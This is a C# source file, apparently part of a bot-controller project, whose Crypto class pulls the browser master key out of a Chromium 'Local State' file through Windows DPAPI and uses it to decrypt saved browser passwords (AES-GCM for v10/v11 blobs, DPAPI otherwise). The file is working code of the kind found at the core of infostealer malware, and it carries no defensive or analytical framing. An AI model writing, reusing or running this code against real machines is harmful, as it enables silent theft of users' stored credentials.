using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

namespace BotController1.Core;

public static class Crypto
{
    private static readonly UTF8Encoding StrictUtf8 = new(false, true);

    public static byte[] GetBrowserKey(string localStatePath)
    {
        using var doc = JsonDocument.Parse(File.ReadAllText(localStatePath));
        var b64 = doc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();
        var raw = Convert.FromBase64String(b64);
        var dpapi = raw.AsSpan(5).ToArray();
        return ProtectedData.Unprotect(dpapi, null, DataProtectionScope.CurrentUser);
    }

    public static string DecryptPassword(byte[] blob, byte[] key)
    {
        try
        {
            if (blob == null || blob.Length < 3)
                return null;
            var v10 = blob[0] == 'v' && blob[1] == '1' && (blob[2] == '0' || blob[2] == '1');
            if (v10)
            {
                if (blob.Length < 31)
                    return null;
                var nonce = blob[3..15];
                var ciphertext = blob[15..^16];
                var tag = blob[^16..];
                var plaintext = new byte[ciphertext.Length];
                using var aes = new AesGcm(key, 16);
                aes.Decrypt(nonce, ciphertext, tag, plaintext);
                return StrictUtf8.GetString(plaintext);
            }
            return StrictUtf8.GetString(
                ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser));
        }
        catch
        {
            return null;
        }
    }
}
